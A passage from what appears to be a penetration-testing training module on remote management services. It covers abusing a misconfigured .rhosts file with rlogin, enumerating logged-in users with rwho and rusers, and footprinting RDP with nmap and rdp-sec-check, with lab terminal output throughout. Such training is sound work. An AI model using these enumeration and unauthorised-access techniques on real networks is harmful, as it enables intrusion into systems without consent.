<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ rlogin <span class="hljs-number">10.0.17.2</span> -l htb-student

Last login: Fri Dec  <span class="hljs-number">2</span> <span class="hljs-number">16</span>:<span class="hljs-number">11</span>:<span class="hljs-number">21</span> from localhost

<span class="hljs-string">[htb-student@localhost ~]</span>$
</code></pre>
<p>We have successfully logged in under the <code>htb-student</code> account on the remote host due to the misconfigurations in the <code>.rhosts</code> file. Once successfully logged in, we can also abuse the <code>rwho</code> command to list all interactive sessions on the local network by sending requests to the UDP port 513.</p>
<p><strong>Listing Authenticated Users Using Rwho</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ rwho

root     web01:pts/<span class="hljs-number">0</span> <span class="hljs-built_in">Dec</span>  <span class="hljs-number">2</span> <span class="hljs-number">21</span>:<span class="hljs-number">34</span>
htb-student     workstn01:tty1  <span class="hljs-built_in">Dec</span>  <span class="hljs-number">2</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>  <span class="hljs-number">2</span>:<span class="hljs-number">25</span>
</code></pre>
<p>From this information, we can see that the <code>htb-student</code> user is currently authenticated to the <code>workstn01</code> host, whereas the <code>root</code> user is authenticated to the <code>web01</code> host. We can use this to our advantage when scoping out potential usernames to use during further attacks on hosts over the network. However, the <code>rwho</code> daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.</p>
<p><strong>Listing Authenticated Users Using Rusers</strong></p>
<p>To provide additional information in conjunction with <code>rwho</code>, we can issue the <code>rusers</code> command. This will give us a more detailed account of all logged-in users over the network, including information such as the username, hostname of the accessed machine, TTY that the user is logged in to, the date and time the user logged in, the amount of time since the user typed on the keyboard, and the remote host they logged in from (if applicable).</p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ rusers -<span class="hljs-built_in">al</span> <span class="hljs-number">10.0</span><span class="hljs-meta">.17</span><span class="hljs-meta">.5</span>

htb-student     <span class="hljs-number">10.0</span><span class="hljs-meta">.17</span><span class="hljs-meta">.5</span>:console          <span class="hljs-keyword">Dec</span> <span class="hljs-number">2</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>     <span class="hljs-number">2</span>:<span class="hljs-number">25</span>
</code></pre>
<p>As we can see, R-services are less frequently used nowadays due to their inherent security flaws and the availability of more secure protocols such as SSH. To be a well-rounded information security professional, we must have a broad and deep understanding of many systems, applications, protocols, etc. So, file away this knowledge about R-services because you never know when you may encounter them.</p>
<hr>
<h3 id="final-thoughts">Final Thoughts</h3>
<p>Remote management services can provide us with a treasure trove of data and often be abused for unauthorized access through either weak/default credentials or password re-use. We should always probe these services for as much information as we can gather and leave no stone unturned, especially when we have compiled a list of credentials from elsewhere in the target network.</p>
<h2 id="windows-remote-management-protocols">Windows Remote Management Protocols</h2>
<hr>
<p>Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a component of the Windows hardware management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnostics and control through baseboard management controllers, and a COM API and script objects that enable us to write applications that communicate remotely through the WS-Management protocol.</p>
<p>The main components used for remote management of Windows and Windows servers are the following:</p>
<ul>
<li>Remote Desktop Protocol (<code>RDP</code>)</li>
<li>Windows Remote Management (<code>WinRM</code>)</li>
<li>Windows Management Instrumentation (<code>WMI</code>)</li>
</ul>
<hr>
<h3 id="rdp">RDP</h3>
<p>The <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">Remote Desktop Protocol</a> (<code>RDP</code>) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.</p>
<p>For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If <a href="https://en.wikipedia.org/wiki/Network\_address\_translation">Network Address Translation</a> (<code>NAT</code>) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.</p>
<p>RDP has handled <a href="https://en.wikipedia.org/wiki/Transport\_Layer\_Security">Transport Layer Security</a> (<code>TLS/SSL</code>) since Windows Vista, which means that all data, and especially the login process, is protected in the network by its good encryption. However, many Windows systems do not insist on this but still accept inadequate encryption via <a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322">RDP Security</a>. Nevertheless, even with this, an attacker is still far from being locked out because the identity-providing certificates are merely self-signed by default. This means that the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.</p>
<p>The <code>Remote Desktop</code> service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the <code>Server Manager</code> and comes with the default setting to allow connections to the service only to hosts with <a href="https://en.wikipedia.org/wiki/Network\_Level\_Authentication">Network level authentication</a> (<code>NLA</code>).</p>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if <code>NLA</code> is enabled on the server or not, the product version, and the hostname.</p>
<p><strong>Nmap</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ nmap -sV -sC <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span> -p3389 --script rdp*

Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2021</span><span class="hljs-number">-11</span><span class="hljs-number">-06</span> <span class="hljs-number">15</span>:<span class="hljs-number">45</span> CET
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span>
Host is up (<span class="hljs-number">0.036</span>s latency).

PORT     STATE SERVICE       VERSION
<span class="hljs-number">3389</span>/tcp open  ms-wbt-server Microsoft Terminal Services
| <span class="hljs-type">rdp</span>-enum-encryption: 
|   <span class="hljs-type">Security</span> layer
|     <span class="hljs-type">CredSSP</span> (NLA): SUCCESS
|     <span class="hljs-type">CredSSP</span> <span class="hljs-built_in">with</span> Early User Auth: SUCCESS
|<span class="hljs-type">_</span>    RDSTLS: SUCCESS
| <span class="hljs-type">rdp</span>-ntlm-info: 
|   <span class="hljs-type">Target_Name</span>: ILF-SQL<span class="hljs-number">-01</span>
|   <span class="hljs-type">NetBIOS_Domain_Name</span>: ILF-SQL<span class="hljs-number">-01</span>
|   <span class="hljs-type">NetBIOS_Computer_Name</span>: ILF-SQL<span class="hljs-number">-01</span>
|   <span class="hljs-type">DNS_Domain_Name</span>: ILF-SQL<span class="hljs-number">-01</span>
|   <span class="hljs-type">DNS_Computer_Name</span>: ILF-SQL<span class="hljs-number">-01</span>
|   <span class="hljs-type">Product_Version</span>: <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span>
|<span class="hljs-type">_</span>  System_Time: <span class="hljs-number">2021</span><span class="hljs-number">-11</span><span class="hljs-number">-06</span>T13:<span class="hljs-number">46</span>:<span class="hljs-number">00</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
Service <span class="hljs-keyword">Info</span>: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-built_in">in</span> <span class="hljs-number">8.26</span> seconds
</code></pre>
<p>In addition, we can use <code>--packet-trace</code> to track the individual packages and inspect their contents manually. We can see that the <code>RDP cookies</code> (<code>mstshash=nmap</code>) used by Nmap to interact with the RDP server can be identified by <code>threat hunters</code> and various security services such as <a href="https://en.wikipedia.org/wiki/Endpoint\_detection\_and\_response">Endpoint Detection and Response</a> (<code>EDR</code>), and can lock us out as penetration testers on hardened networks.</p>
<pre><code class="lang-shell-session">[!bash!]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET
SENT (0.2506s) ICMP [10.10.14.20 &gt; 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ]
SENT (0.2507s) TCP 10.10.14.20:55516 &gt; 10.129.201.248:443 S ttl=42 id=24195 iplen=44  seq=1926233369 win=1024 &lt;mss 1460&gt;
SENT (0.2507s) TCP 10.10.14.20:55516 &gt; 10.129.201.248:80 A ttl=55 id=50395 iplen=40  seq=0 win=1024
SENT (0.2517s) ICMP [10.10.14.20 &gt; 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ]
RCVD (0.2814s) ICMP [10.129.201.248 &gt; 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ]
SENT (0.3264s) TCP 10.10.14.20:55772 &gt; 10.129.201.248:3389 S ttl=56 id=274 iplen=44  seq=2635590698 win=1024 &lt;mss 1460&gt;
RCVD (0.3565s) TCP 10.129.201.248:3389 &gt; 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44  seq=3526777417 win=64000 &lt;mss 1357&gt;
NSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD <span class="hljs-comment">#1)</span>
NSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD <span class="hljs-comment">#1) EID 8</span>
NSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID<span class="hljs-number"> 8 </span>[10.129.201.248:3389]
Service scan sending probe NULL to 10.129.201.248:3389 (tcp)
NSOCK INFO [0.4830s] nsock_read(): Read request from IOD <span class="hljs-comment">#1 [10.129.201.248:3389] (timeout: 6000ms) EID 18</span>
NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID<span class="hljs-number"> 18 </span>[10.129.201.248:3389]
Service scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp)
NSOCK INFO [6.4880s] nsock_write(): Write request for<span class="hljs-number"> 42 </span>bytes to IOD <span class="hljs-comment">#1 EID 27 [10.129.201.248:3389]</span>
NSOCK INFO [6.4880s] nsock_read(): Read request from IOD <span class="hljs-comment">#1 [10.129.201.248:3389] (timeout: 5000ms) EID 34</span>
NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID<span class="hljs-number"> 27 </span>[10.129.201.248:3389]
NSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID<span class="hljs-number"> 34 </span>[10.129.201.248:3389] (19 bytes): .........4.........
Service scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server.  Version: |Microsoft Terminal Services|||

...SNIP...

NSOCK INFO [6.5610s] nsock_write(): Write request for<span class="hljs-number"> 54 </span>bytes to IOD <span class="hljs-comment">#1 EID 27 [10.129.201.248:3389]</span>
NSE: TCP 10.10.14.20:36630 &gt; 10.129.201.248:3389 | 00000000:<span class="hljs-number"> 03 </span>00<span class="hljs-number"> 00 </span>2a<span class="hljs-number"> 25 </span>e0<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>43 6f 6f 6b<span class="hljs-number"> 69 </span>   *%      Cooki
00000010:<span class="hljs-number"> 65 </span>3a<span class="hljs-number"> 20 </span>6d<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 73 </span>68<span class="hljs-number"> 61 </span>73<span class="hljs-number"> 68 </span>3d 6e 6d<span class="hljs-number"> 61 </span>70 e: mstshash=nmap
00000020: 0d 0a<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 08 </span>00 0b<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span> 

...SNIP...

NSOCK INFO [6.6820s] nsock_write(): Write request for<span class="hljs-number"> 57 </span>bytes to IOD <span class="hljs-comment">#2 EID 67 [10.129.201.248:3389]</span>
NSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID<span class="hljs-number"> 67 </span>[10.129.201.248:3389]
NSE: TCP 10.10.14.20:36630 &gt; 10.129.201.248:3389 | SEND
NSOCK INFO [6.6820s] nsock_read(): Read request from IOD <span class="hljs-comment">#2 [10.129.201.248:3389] (timeout: 5000ms) EID 74</span>
NSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID<span class="hljs-number"> 74 </span>[10.129.201.248:3389] (211 bytes)
NSE: TCP 10.10.14.20:36630 &lt; 10.129.201.248:3389 | 
00000000:<span class="hljs-number"> 30 </span>81 d0 a0<span class="hljs-number"> 03 </span>02<span class="hljs-number"> 01 </span>06 a1<span class="hljs-number"> 81 </span>c8<span class="hljs-number"> 30 </span>81 c5<span class="hljs-number"> 30 </span>81<span class="hljs-number"> 0 </span>        <span class="hljs-number"> 0 </span> 0
00000010: c2 a0<span class="hljs-number"> 81 </span>bf<span class="hljs-number"> 04 </span>81 bc 4e<span class="hljs-number"> 54 </span>4c 4d<span class="hljs-number"> 53 </span>53<span class="hljs-number"> 50 </span>00<span class="hljs-number"> 02 </span>       NTLMSSP
00000020:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>14<span class="hljs-number"> 00 </span>14<span class="hljs-number"> 00 </span>38<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>35<span class="hljs-number"> 82 </span>8a e2 b9       <span class="hljs-number"> 8 </span>  5
00000030:<span class="hljs-number"> 73 </span>b0 b3<span class="hljs-number"> 91 </span>9f 1b 0d<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 70 </span>s              p
00000040:<span class="hljs-number"> 00 </span>70<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>0a<span class="hljs-number"> 00 </span>63<span class="hljs-number"> 45 </span>00<span class="hljs-number"> 00 </span>00 0f<span class="hljs-number"> 49 </span> p L     cE    I
00000050:<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>46<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>53<span class="hljs-number"> 00 </span>51<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>30  L F - S Q L - 0
00000060:<span class="hljs-number"> 00 </span>31<span class="hljs-number"> 00 </span>02<span class="hljs-number"> 00 </span>14<span class="hljs-number"> 00 </span>49<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>46<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>53 <span class="hljs-number"> 1 </span>    I L F - S
00000070:<span class="hljs-number"> 00 </span>51<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>30<span class="hljs-number"> 00 </span>31<span class="hljs-number"> 00 </span>01<span class="hljs-number"> 00 </span>14<span class="hljs-number"> 00 </span>49  Q L -<span class="hljs-number"> 0 </span>1     I
00000080:<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>46<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>53<span class="hljs-number"> 00 </span>51<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>30  L F - S Q L - 0
00000090:<span class="hljs-number"> 00 </span>31<span class="hljs-number"> 00 </span>04<span class="hljs-number"> 00 </span>14<span class="hljs-number"> 00 </span>49<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>46<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>53 <span class="hljs-number"> 1 </span>    I L F - S
000000a0:<span class="hljs-number"> 00 </span>51<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>30<span class="hljs-number"> 00 </span>31<span class="hljs-number"> 00 </span>03<span class="hljs-number"> 00 </span>14<span class="hljs-number"> 00 </span>49  Q L -<span class="hljs-number"> 0 </span>1     I
000000b0:<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>46<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>53<span class="hljs-number"> 00 </span>51<span class="hljs-number"> 00 </span>4c<span class="hljs-number"> 00 </span>2d<span class="hljs-number"> 00 </span>30  L F - S Q L - 0
000000c0:<span class="hljs-number"> 00 </span>31<span class="hljs-number"> 00 </span>07<span class="hljs-number"> 00 </span>08<span class="hljs-number"> 00 </span>1d b3 e8 f2<span class="hljs-number"> 19 </span>d3 d7<span class="hljs-number"> 01 </span>00  1
000000d0:<span class="hljs-number"> 00 </span>00 00

...SNIP...
</code></pre>
<p>A Perl script named <a href="https://github.com/CiscoCXSecurity/rdp-sec-check">rdp-sec-check.pl</a> has also been developed by <a href="https://github.com/CiscoCXSecurity">Cisco CX Security Labs</a> that can unauthentically identify the security settings of RDP servers based on the handshakes.</p>
<p><strong>RDP Security Check - Installation</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ sudo cpan

Loading internal logger. Log::Log4perl recommended for better logging

CPAN.pm requires configuration, but most <span class="hljs-keyword">of</span> it can be done automatically.
If you answer <span class="hljs-string">'no'</span> below, you will enter an interactive dialog for each
configuration option instead.

Would you like to configure <span class="hljs-keyword">as</span> much <span class="hljs-keyword">as</span> possible automatically? [yes] yes


Autoconfiguration complete.

commit: wrote <span class="hljs-string">'/root/.cpan/CPAN/MyConfig.pm'</span>

You can re-run configuration any time <span class="hljs-keyword">with</span> <span class="hljs-string">'o conf init'</span> <span class="hljs-keyword">in</span> the CPAN shell

cpan shell -- CPAN exploration and modules installation (v2<span class="hljs-number">.27</span>)
Enter <span class="hljs-string">'h'</span> for help.


cpan[<span class="hljs-number">1</span>]&gt; install Encoding::BER

Fetching <span class="hljs-keyword">with</span> LWP:
http:<span class="hljs-comment">//www.cpan.org/authors/01mailrc.txt.gz</span>
Reading <span class="hljs-string">'/root/.cpan/sources/authors/01mailrc.txt.gz'</span>
............................................................................DONE
...SNIP...
</code></pre>
<p><strong>RDP Security Check</strong></p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check
[<span class="hljs-name">!bash!</span>]$ ./rdp-sec-check.pl <span class="hljs-number">10.129</span>.201.248

Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov  <span class="hljs-number">7</span> <span class="hljs-number">16</span>:50:32 <span class="hljs-number">2021</span>

[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Scanning <span class="hljs-number">1</span> hosts

Target:    <span class="hljs-number">10.129</span>.201.248
IP:        <span class="hljs-number">10.129</span>.201.248
Port:      <span class="hljs-number">3389</span>

[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Checking supported protocols

[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking if RDP Security (<span class="hljs-name">PROTOCOL_RDP</span>) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking if TLS Security (<span class="hljs-name">PROTOCOL_SSL</span>) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking if CredSSP Security (<span class="hljs-name">PROTOCOL_HYBRID</span>) is supported [<span class="hljs-name">uses</span> NLA]...Supported

[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Checking RDP Security Layer

[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported

[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Summary of protocol support

[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports PROTOCOL_SSL   : FALSE
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports PROTOCOL_HYBRID: TRUE
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports PROTOCOL_RDP   : FALSE

[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Summary of RDP encryption support

[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] <span class="hljs-number">10.129</span>.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE

[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Summary of security issues


rdp-sec-check v0.9-beta completed at Sun Nov  <span class="hljs-number">7</span> <span class="hljs-number">16</span>:50:33 <span class="hljs-number">2021</span>
</code></pre>
<p>Authentication and connection to such RDP servers can be made in several ways. For example, we can connect to RDP servers on Linux using <code>xfreerdp</code>, <code>rdesktop</code>, or <code>Remmina</code> and interact with the GUI of the server accordingly.</p>
<p><strong>Initiate an RDP Session</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248

[<span class="hljs-string">16:37:47:135</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_connect:freerdp_</span>set<span class="hljs-emphasis">_last_</span>error_ex resetting error state
[<span class="hljs-string">16:37:47:135</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpdr
[<span class="hljs-string">16:37:47:135</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpsnd
[<span class="hljs-string">16:37:47:135</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx cliprdr
[<span class="hljs-string">16:37:47:447</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.primitives</span>] - primitives autodetect, using optimized
[<span class="hljs-string">16:37:47:453</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_tcp_</span>is<span class="hljs-emphasis">_hostname_</span>resolvable:freerdp<span class="hljs-emphasis">_set_</span>last<span class="hljs-emphasis">_error_</span>ex resetting error state
[<span class="hljs-string">16:37:47:453</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_tcp_</span>connect:freerdp<span class="hljs-emphasis">_set_</span>last<span class="hljs-emphasis">_error_</span>ex resetting error state
[<span class="hljs-string">16:37:47:523</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - creating directory /home/cry0l1t3/.config/freerdp
[<span class="hljs-string">16:37:47:523</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - creating directory [/home/cry0l1t3/.config/freerdp/certs]
[<span class="hljs-string">16:37:47:523</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - created directory [/home/cry0l1t3/.config/freerdp/server]
[<span class="hljs-string">16:37:47:599</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[<span class="hljs-string">16:37:47:599</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">WARN</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - CN = ILF-SQL-01
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - The hostname used for this connection (10.129.201.248:3389) 
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - does not match the name given in the certificate:
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - Common Name (CN):
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] -      ILF-SQL-01
[<span class="hljs-string">16:37:47:600</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">ERROR</span>][<span class="hljs-symbol">com.freerdp.crypto</span>] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.201.248:3389 (RDP-Server):
<span class="hljs-code">        Common Name: ILF-SQL-01</span>
<span class="hljs-code">        Subject:     CN = ILF-SQL-01</span>
<span class="hljs-code">        Issuer:      CN = ILF-SQL-01</span>
<span class="hljs-code">        Thumbprint:  b7:5f:00:ca:91:00:0a:29:0c:b5:14:21:f3:b0:ca:9e:af:8c:62:d6:dc:f9:50:ec:ac:06:38:1f:c5:d6:a9:39</span>
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.


Do you trust the above certificate? (Y/T/N) y

[<span class="hljs-string">16:37:48:801</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] - VERSION ={
[<span class="hljs-string">16:37:48:801</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -      ProductMajorVersion: 6
[<span class="hljs-string">16:37:48:801</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -      ProductMinorVersion: 1
[<span class="hljs-string">16:37:48:801</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -      ProductBuild: 7601
[<span class="hljs-string">16:37:48:801</span>] [<span class="hljs-string">95319:95320</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.winpr.sspi.NTLM</span>] -      Reserved: 0x000000
</code></pre>
<p>After successful authentication, a new window will appear with access to the server&#39;s desktop to which we have connected.</p>
<hr>
<h3 id="winrm">WinRM</h3>
<p>The Windows Remote Management (<code>WinRM</code>) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (<code>SOAP</code>) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on <code>TCP</code> ports <code>5985</code> and <code>5986</code> for communication, with the last port <code>5986 using HTTPS</code>, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.</p>
